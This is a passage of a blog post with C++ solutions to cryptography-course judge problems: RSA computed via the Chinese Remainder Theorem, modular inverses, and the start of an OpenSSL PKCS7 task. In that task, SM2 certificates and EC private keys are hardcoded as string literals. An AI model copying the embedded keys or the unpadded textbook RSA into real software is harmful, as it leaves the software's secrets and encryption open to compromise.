eBack, <span class="number">2</span>);</span><br><span class="line">		<span class="built_in">mpz_mod_ui</span>(temp, eBack, <span class="number">2</span>);		<span class="comment">// 求余数</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ChineseRemainderTheorem</span><span class="params">(<span class="keyword">mpz_t</span> paraB1, <span class="keyword">mpz_t</span> paraB2, <span class="keyword">mpz_t</span> paraM1, <span class="keyword">mpz_t</span> paraM2)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">mpz_t</span> b1, b2, m1, m2, m, m1Inverse, m2Inverse;</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(b1, paraB1);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(b2, paraB2);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(m1, paraM1);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(m2, paraM2);</span><br><span class="line">	<span class="built_in">mpz_init</span>(m1Inverse);</span><br><span class="line">	<span class="built_in">mpz_init</span>(m2Inverse);</span><br><span class="line">	<span class="built_in">mpz_init</span>(m);</span><br><span class="line">	<span class="built_in">mpz_mul</span>(m, m1, m2);</span><br><span class="line">	<span class="built_in">calInverse</span>(m1Inverse, m1, m2);</span><br><span class="line">	<span class="built_in">calInverse</span>(m2Inverse, m2, m1);</span><br><span class="line">	<span class="built_in">mpz_mul</span>(b1, b1, m2);</span><br><span class="line">	<span class="built_in">mpz_mul</span>(b1, b1, m2Inverse);</span><br><span class="line">	<span class="built_in">mpz_mul</span>(b2, b2, m1);</span><br><span class="line">	<span class="built_in">mpz_mul</span>(b2, b2, m1Inverse);</span><br><span class="line">	<span class="built_in">mpz_add</span>(b1, b1, b2);</span><br><span class="line">	<span class="built_in">mpz_mod</span>(b1, b1, m);</span><br><span class="line">	<span class="built_in">gmp_printf</span>(<span class="string">&quot;%Zd\n&quot;</span>, b1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">mpz_t</span> e, m, p, q, b1, b2;</span><br><span class="line">	<span class="built_in">mpz_init</span>(e);</span><br><span class="line">	<span class="built_in">mpz_init</span>(m);</span><br><span class="line">	<span class="built_in">mpz_init</span>(p);</span><br><span class="line">	<span class="built_in">mpz_init</span>(q);</span><br><span class="line">	<span class="built_in">mpz_init</span>(b1);</span><br><span class="line">	<span class="built_in">mpz_init</span>(b2);</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="built_in">gmp_scanf</span>(<span class="string">&quot;%Zd%Zd%Zd%Zd&quot;</span>, e, m, p, q);</span><br><span class="line">		<span class="built_in">mpz_set</span>(b1, m);</span><br><span class="line">		<span class="built_in">mpz_set</span>(b2, m);</span><br><span class="line">		<span class="built_in">expmod</span>(b1, e, p);<span class="comment">//m^e mod p</span></span><br><span class="line">		<span class="built_in">expmod</span>(b2, e, q);<span class="comment">//m^e mod q</span></span><br><span class="line">		<span class="built_in">ChineseRemainderTheorem</span>(b1, b2, p, q);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="中国剩余定理"><a class="markdownIt-Anchor" href="#中国剩余定理"></a> 中国剩余定理</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/VII">oj | 中国剩余定理</a></p>
<p>题目要求：<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030111741.png" alt="中国剩余定理" /></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;gmp.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;libgmp-10.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> GCC optimize(<span class="meta-string">&quot;O3&quot;</span>)</span></span><br><span class="line"><span class="keyword">mpz_t</span> st[<span class="number">800</span>];</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">1000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calInverse</span><span class="params">(<span class="keyword">mpz_t</span> eInverse, <span class="keyword">mpz_t</span> paraE, <span class="keyword">mpz_t</span> paraN)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用辗转相除法求逆</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">mpz_t</span> n, temp, temp1, temp2, e;</span><br><span class="line">    <span class="built_in">mpz_init_set</span>(e, paraE);</span><br><span class="line">    <span class="built_in">mpz_init_set</span>(n, paraN);</span><br><span class="line">    <span class="built_in">mpz_init</span>(temp);</span><br><span class="line">    <span class="built_in">mpz_init</span>(temp1);</span><br><span class="line">    <span class="built_in">mpz_init</span>(temp2);</span><br><span class="line">    <span class="comment">//mpz_init_set_ui(temp, 0);</span></span><br><span class="line">    <span class="comment">//mpz_sub(n, temp, n);</span></span><br><span class="line">    <span class="built_in">mpz_neg</span>(n, n);</span><br><span class="line">    <span class="comment">// 求解e的逆</span></span><br><span class="line">    <span class="comment">//mpz_mod(temp, e, n);</span></span><br><span class="line">    <span class="comment">//mpz_sub(temp1, e, temp);</span></span><br><span class="line">    <span class="comment">//mpz_div(temp1, temp1, n);</span></span><br><span class="line">    <span class="built_in">mpz_tdiv_qr</span>(temp1, temp, e, n);</span><br><span class="line">    <span class="built_in">mpz_set</span>(st[<span class="number">0</span>], temp1);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">mpz_cmp_ui</span>(temp, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="built_in">mpz_set</span>(st[count], temp1);</span><br><span class="line">        <span class="built_in">mpz_set</span>(e, n);</span><br><span class="line">        <span class="built_in">mpz_set</span>(n, temp);</span><br><span class="line">        <span class="built_in">mpz_tdiv_qr</span>(temp1, temp, e, n);</span><br><span class="line">        <span class="comment">//mpz_mod(temp, e, n);</span></span><br><span class="line">        <span class="comment">//mpz_sub(temp1, e, temp);</span></span><br><span class="line">        <span class="comment">//mpz_div(temp1, temp1, n);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mpz_mul</span>(temp, temp1, e);</span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(temp2, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">mpz_cmp_ui</span>(temp, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">mpz_neg</span>(temp2, temp2);</span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(temp1, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mpz_sub</span>(n, temp1, n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = count; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">mpz_init_set</span>(temp, temp2);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(temp2, temp2, st[i]);</span><br><span class="line">        <span class="built_in">mpz_sub</span>(temp2, temp1, temp2);</span><br><span class="line">        <span class="built_in">mpz_set</span>(temp1, temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//gmp_printf(&quot;%Zd\n&quot;, temp1);</span></span><br><span class="line">    <span class="built_in">mpz_set</span>(eInverse, temp1);</span><br><span class="line">    <span class="built_in">mpz_mod</span>(eInverse, eInverse, paraN);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">expmod</span><span class="params">(<span class="keyword">mpz_t</span> a, <span class="keyword">mpz_t</span> paraE, <span class="keyword">mpz_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 平方乘算法</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">mpz_t</span> aBack;</span><br><span class="line">    <span class="built_in">mpz_init_set</span>(aBack, a);</span><br><span class="line">    <span class="built_in">mpz_get_str</span>(str, <span class="number">2</span>, paraE);		<span class="comment">// 将其转化为二进制字符串，加速运算</span></span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(a, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (str[i] != <span class="string">&#x27;\0&#x27;</span>) &#123;		<span class="comment">// 使用平方乘算法</span></span><br><span class="line">        <span class="built_in">mpz_mul</span>(a, a, a);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(a, a, n);</span><br><span class="line">        <span class="keyword">if</span> (str[i] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">mpz_mul</span>(a, a, aBack);</span><br><span class="line">            <span class="built_in">mpz_mod</span>(a, a, n);</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">mpz_t</span> e, m, p, q, b1, b2, B, d, phi, temp, pInverse, qInverse, _p, _q, d1, d2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">800</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">mpz_init</span>(st[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化一大推</span></span><br><span class="line">    <span class="built_in">mpz_init</span>(e);<span class="built_in">mpz_init</span>(m);<span class="built_in">mpz_init</span>(p);<span class="built_in">mpz_init</span>(q);<span class="built_in">mpz_init</span>(b1);<span class="built_in">mpz_init</span>(b2);</span><br><span class="line">    <span class="built_in">mpz_init</span>(B);<span class="built_in">mpz_init</span>(d);<span class="built_in">mpz_init</span>(temp);<span class="built_in">mpz_init</span>(phi);<span class="built_in">mpz_init</span>(pInverse);</span><br><span class="line">    <span class="built_in">mpz_init</span>(qInverse);<span class="built_in">mpz_init</span>(_p);<span class="built_in">mpz_init</span>(_q);<span class="built_in">mpz_init</span>(d1);<span class="built_in">mpz_init</span>(d2);</span><br><span class="line">    <span class="built_in">gmp_scanf</span>(<span class="string">&quot;%d%Zd%Zd%Zd&quot;</span>,&amp;n , p, q, e);</span><br><span class="line">    <span class="built_in">calInverse</span>(pInverse, p, q);		<span class="comment">// 计算中国剩余定理需要用到的逆</span></span><br><span class="line">    <span class="built_in">calInverse</span>(qInverse, q, p);</span><br><span class="line">    <span class="built_in">mpz_mul</span>(B, p, q);		<span class="comment">// 计算p q之积</span></span><br><span class="line">    <span class="built_in">mpz_sub_ui</span>(_p, p, <span class="number">1</span>);	<span class="comment">// 计算p-1和q-1</span></span><br><span class="line">    <span class="built_in">mpz_sub_ui</span>(_q, q, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">mpz_mul</span>(phi, _p, _q);</span><br><span class="line">    <span class="built_in">calInverse</span>(d, e, phi);	<span class="comment">// 计算d的逆e</span></span><br><span class="line">    <span class="built_in">mpz_mod</span>(d1, d, _p);		<span class="comment">// 使用中国剩余定理，分别将d模除p-1和q-1</span></span><br><span class="line">    <span class="built_in">mpz_mod</span>(d2, d, _q);</span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        <span class="built_in">gmp_scanf</span>(<span class="string">&quot;%Zd&quot;</span>, m);</span><br><span class="line">        <span class="built_in">mpz_set</span>(b1, m);</span><br><span class="line">        <span class="built_in">mpz_set</span>(b2, m);</span><br><span class="line">        <span class="built_in">expmod</span>(b1, d1, p);		<span class="comment">// 分别计算m^d1和m^d2</span></span><br><span class="line">        <span class="built_in">expmod</span>(b2, d2, q);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpz_mul</span>(b1, b1, q);		<span class="comment">// 运用中国剩余定理计算</span></span><br><span class="line">        <span class="built_in">mpz_mod</span>(b1, b1, B);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(b1, b1, qInverse);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(b1, b1, B);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpz_mul</span>(b2, b2, p);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(b2, b2, B);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(b2, b2, pInverse);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(b2, b2, B);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpz_add</span>(b1, b1, b2);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(b1, b1, B);</span><br><span class="line">        <span class="built_in">gmp_printf</span>(<span class="string">&quot;%Zd\n&quot;</span>, b1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="pkcs-7"><a class="markdownIt-Anchor" href="#pkcs-7"></a> PKCS 7</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/VIII">oj | PKCS7</a></p>
<p>题目要求：<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030111921.png" alt="PKCS7" /></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/conf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/ec.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/sm3.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/bio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/pem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/x509.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/sm2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/pkcs7.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#pragma comment(lib, &quot;libcrypto.a&quot;)</span></span><br><span class="line"><span class="comment">//#pragma comment(lib, &quot;libssl.a&quot;)</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> certC[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">MIICPjCCAeWgAwIBAgIBBDAKBggqgRzPVQGDdTBbMQswCQYDVQQGEwJDTjEOMAwG \n\</span></span><br><span class="line"><span class="string">A1UECAwFSHVCZWkxDjAMBgNVBAcMBVd1SGFuMQ0wCwYDVQQKDARIVVNUMQwwCgYD \n\</span></span><br><span class="line"><span class="string">VQQLDANDU0UxDzANBgNVBAMMBmNhcm9vdDAeFw0yMDA5MjcxNDIwMjFaFw0zMDA5 \n\</span></span><br><span class="line"><span class="string">MjUxNDIwMjFaMG0xCzAJBgNVBAYTAkNOMQ4wDAYDVQQIDAVIdUJlaTENMAsGA1UE \n\</span></span><br><span class="line"><span class="string">CgwESFVTVDEMMAoGA1UECwwDQ1NFMQ4wDAYDVQQDDAVVc2VyQzEhMB8GCSqGSIb3 \n\</span></span><br><span class="line"><span class="string">DQEJARYSeG10YW5nQGh1c3QuZWR1LmNuMFkwEwYHKoZIzj0CAQYIKoEcz1UBgi0D \n\</span></span><br><span class="line"><span class="string">QgAEHSrf7RNs2+Rf1TrPeJREGSy+6YTC9t4rtp1vY7Akuct504We3iAiALcIarFt \n\</span></span><br><span class="line"><span class="string">QxQOr5Zf4l7Ybt3NocM8fLxkNqOBhzCBhDAJBgNVHRMEAjAAMAsGA1UdDwQEAwIF \n\</span></span><br><span class="line"><span class="string">4DAqBglghkgBhvhCAQ0EHRYbR21TU0wgR2VuZXJhdGVkIENlcnRpZmljYXRlMB0G \n\</span></span><br><span class="line"><span class="string">A1UdDgQWBBQvMLtMYb/dD9cNF0+s/cZNxHUBGjAfBgNVHSMEGDAWgBQAvmFbdFTO \n\</span></span><br><span class="line"><span class="string">q+yJPMhzWBQd4rm7NDAKBggqgRzPVQGDdQNHADBEAiBrTVuYbSUlOX4TYV4q094S \n\</span></span><br><span class="line"><span class="string">XgfnobZWYPeRjGmBNAEIMwIgfHrQR9RfLd62bg0iZBpfgwvtGuaCE3DX24xapZ6U \n\</span></span><br><span class="line"><span class="string">fIc= \n\</span></span><br><span class="line"><span class="string">-----END CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> certB[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">MIICHDCCAcKgAwIBAgIBAzAKBggqgRzPVQGDdTBbMQswCQYDVQQGEwJDTjEOMAwG \n\</span></span><br><span class="line"><span class="string">A1UECAwFSHVCZWkxDjAMBgNVBAcMBVd1SGFuMQ0wCwYDVQQKDARIVVNUMQwwCgYD \n\</span></span><br><span class="line"><span class="string">VQQLDANDU0UxDzANBgNVBAMMBmNhcm9vdDAeFw0yMDA5MjAyMTIxMDNaFw0zMDA5 \n\</span></span><br><span class="line"><span class="string">MTgyMTIxMDNaMEoxCzAJBgNVBAYTAkNOMQ4wDAYDVQQIDAVIdUJlaTENMAsGA1UE \n\</span></span><br><span class="line"><span class="string">CgwESFVTVDEMMAoGA1UECwwDQ1NFMQ4wDAYDVQQDDAVVc2VyQjBZMBMGByqGSM49 \n\</span></span><br><span class="line"><span class="string">AgEGCCqBHM9VAYItA0IABB+6yy4hQEnt0lkrBm8RVLXz2P/6V6i74DOkTsomIS5D \n\</span></span><br><span class="line"><span class="string">8RLpcK03vJL+UfPzQO5Ekr3LBiEPRD1oa+h5wlC6ZJejgYcwgYQwCQYDVR0TBAIw \n\</span></span><br><span class="line"><span class="string">ADALBgNVHQ8EBAMCBSAwKgYJYIZIAYb4QgENBB0WG0dtU1NMIEdlbmVyYXRlZCBD \n\</span></span><br><span class="line"><span class="string">ZXJ0aWZpY2F0ZTAdBgNVHQ4EFgQUAhr5rk22vn/vEACBoMYN1FMPmGAwHwYDVR0j \n\</span></span><br><span class="line"><span class="string">BBgwFoAUAL5hW3RUzqvsiTzIc1gUHeK5uzQwCgYIKoEcz1UBg3UDSAAwRQIhANkY \n\</span></span><br><span class="line"><span class="string">3oWdgG8jriJXuRhX5le4QjE19EnKB4rWCQcKvORfAiAR4hnLYT+dXgFCxVgPkjGO \n\</span></span><br><span class="line"><span class="string">PDXj9mXJk6crvhRRxZfWNg== \n\</span></span><br><span class="line"><span class="string">-----END CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> cacert[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">MIIB/zCCAaagAwIBAgIJAKKa0PAt9M1FMAoGCCqBHM9VAYN1MFsxCzAJBgNVBAYT \n\</span></span><br><span class="line"><span class="string">AkNOMQ4wDAYDVQQIDAVIdUJlaTEOMAwGA1UEBwwFV3VIYW4xDTALBgNVBAoMBEhV \n\</span></span><br><span class="line"><span class="string">U1QxDDAKBgNVBAsMA0NTRTEPMA0GA1UEAwwGY2Fyb290MB4XDTIwMDkyMDIwNTkx \n\</span></span><br><span class="line"><span class="string">OVoXDTMwMDkxODIwNTkxOVowWzELMAkGA1UEBhMCQ04xDjAMBgNVBAgMBUh1QmVp \n\</span></span><br><span class="line"><span class="string">MQ4wDAYDVQQHDAVXdUhhbjENMAsGA1UECgwESFVTVDEMMAoGA1UECwwDQ1NFMQ8w \n\</span></span><br><span class="line"><span class="string">DQYDVQQDDAZjYXJvb3QwWTATBgcqhkjOPQIBBggqgRzPVQGCLQNCAASJ8mm28JJR \n\</span></span><br><span class="line"><span class="string">bZKLr6DCo1+KWimpKEsiTfZM19Zi5ao7Au6YLosyN71256MWmjwkwXxJeLa0lCfm \n\</span></span><br><span class="line"><span class="string">kF/YWCX6qGQ0o1MwUTAdBgNVHQ4EFgQUAL5hW3RUzqvsiTzIc1gUHeK5uzQwHwYD \n\</span></span><br><span class="line"><span class="string">VR0jBBgwFoAUAL5hW3RUzqvsiTzIc1gUHeK5uzQwDwYDVR0TAQH/BAUwAwEB/zAK \n\</span></span><br><span class="line"><span class="string">BggqgRzPVQGDdQNHADBEAiAaZMmvE5zzXHx/TBgdUhjtpRH3Jpd6OZ+SOAfMtKxD \n\</span></span><br><span class="line"><span class="string">LAIgdKq/v2Jkmn37Y9U8FHYDfFqk5I0qlQOAmuvbVUi3yvM= \n\</span></span><br><span class="line"><span class="string">-----END CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> certA[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">MIICGzCCAcKgAwIBAgIBAjAKBggqgRzPVQGDdTBbMQswCQYDVQQGEwJDTjEOMAwG \n\</span></span><br><span class="line"><span class="string">A1UECAwFSHVCZWkxDjAMBgNVBAcMBVd1SGFuMQ0wCwYDVQQKDARIVVNUMQwwCgYD \n\</span></span><br><span class="line"><span class="string">VQQLDANDU0UxDzANBgNVBAMMBmNhcm9vdDAeFw0yMDA5MjAyMTEyMTZaFw0zMDA5 \n\</span></span><br><span class="line"><span class="string">MTgyMTEyMTZaMEoxCzAJBgNVBAYTAkNOMQ4wDAYDVQQIDAVIdUJlaTENMAsGA1UE \n\</span></span><br><span class="line"><span class="string">CgwESFVTVDEMMAoGA1UECwwDQ1NFMQ4wDAYDVQQDDAVVc2VyQTBZMBMGByqGSM49 \n\</span></span><br><span class="line"><span class="string">AgEGCCqBHM9VAYItA0IABHvafDoCgn+mlwfMr89kPlC96XsSJACun0xNLEFOnb46 \n\</span></span><br><span class="line"><span class="string">kZSeKUfRtLUcgpDoiwOVV7LiileewgJQqKFi5vy7wICjgYcwgYQwCQYDVR0TBAIw \n\</span></span><br><span class="line"><span class="string">ADALBgNVHQ8EBAMCBSAwKgYJYIZIAYb4QgENBB0WG0dtU1NMIEdlbmVyYXRlZCBD \n\</span></span><br><span class="line"><span class="string">ZXJ0aWZpY2F0ZTAdBgNVHQ4EFgQUIePApg8IOc4nvX/kMH0Cja0Mf4gwHwYDVR0j \n\</span></span><br><span class="line"><span class="string">BBgwFoAUAL5hW3RUzqvsiTzIc1gUHeK5uzQwCgYIKoEcz1UBg3UDRwAwRAIgI3Q0 \n\</span></span><br><span class="line"><span class="string">qndxJPTgvC8sPNarf7pJwdsIrU0Ajmlv4PdatU4CIHU8Pyt6rT9BaHrf8ppJduPe \n\</span></span><br><span class="line"><span class="string">GWCy2i4+1au/zyp42b0r \n\</span></span><br><span class="line"><span class="string">-----END CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> message[] = <span class="string">&quot;A0000000000111111111122222222223333333333444444444455555555556666666666777777777788888888889999999999aaaaaaaaaabbbbbbbbbbccccccccccddddddddddeeeeeeeeeeffffffffff&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> pkeyC[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">BggqgRzPVQGCLQ== \n\</span></span><br><span class="line"><span class="string">-----END EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">-----BEGIN EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">MHcCAQEEIIyXY38MKYLhXXRu/YC6+KxAYJ2rwUIlWAFwOmQKGhDboAoGCCqBHM9V \n\</span></span><br><span class="line"><span class="string">AYItoUQDQgAEHSrf7RNs2+Rf1TrPeJREGSy+6YTC9t4rtp1vY7Akuct504We3iAi \n\</span></span><br><span class="line"><span class="string">ALcIarFtQxQOr5Zf4l7Ybt3NocM8fLxkNg== \n\</span></span><br><span class="line"><span class="string">-----END EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> pkeyA[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">BggqgRzPVQGCLQ== \n\</span></span><br><span class="line"><span class="string">-----END EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">-----BEGIN EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">MHcCAQEEIErrb3NV+HqWKfoINmBAFyNAe/knxHHXt5tXi2YCqgmtoAoGCCqBHM9V \n\</span></span><br><span class="line"><span class="string">AYItoUQDQgAEe9p8OgKCf6aXB8yvz2Q+UL3pexIkAK6fTE0sQU6dvjqRlJ4pR9G0 \n\</span></span><br><span class="line"><span class="string">tRyCkOiLA5VXsuKKV57CAlCooWLm/LvAgA== \n\</span></span><br><span class="line"><span class="string">-----END EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> pkeyB[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">BggqgRzPVQGCLQ== \n\</span></span><br><span class="line"><span class="string">-----END EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">-----BEGIN EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">MHcCAQEEINQhCKslrI3tKt6cK4Kxkor/LBvM8PSv699Xea7kTXTToAoGCCqBHM9V \n\</span></span><br><span class="line"><span class="string">AYItoUQDQgAEH7rLLiFASe3SWSsGbxFUtfPY//pXqLvgM6ROyiYhLkPxEulwrTe8 \n\</span></span><br><span class="line"><span class="string">kv5R8/NA7kSSvcsGIQ9EPWhr6HnCULpklw== \n\</span></span><br><span class="line"><span class="string">-----END EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function">X509 *<span class="title">getX509</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cert)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BIO *bio;</span><br><span class="line">	bio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line">	<span class="built_in">BIO_puts</span>(bio, cert);</span><br><span class="line">    <span class="keyword">return</span>  <span class="built_in">PEM_read_bio_X509</span>(bio, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">EVP_PKEY *<span class="title">getpkey</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *private_key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BIO *bio_pkey = <span class="built_in">BIO_new_mem_buf</span>((<span class="keyword">char</span> *)private_key, <span class="built_in">strlen</span>(private_key));</span><br><span class="line">	<span class="keyword">if</span> (bio_pkey == <span class="literal">NULL</span>)</span><br><span class="line"> 		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"> 	<span class="keyword">return</span>  <span class="built_in">PEM_read_bio_PrivateKey</span>(bio_pkey, <span class="literal">NULL</span>, <span 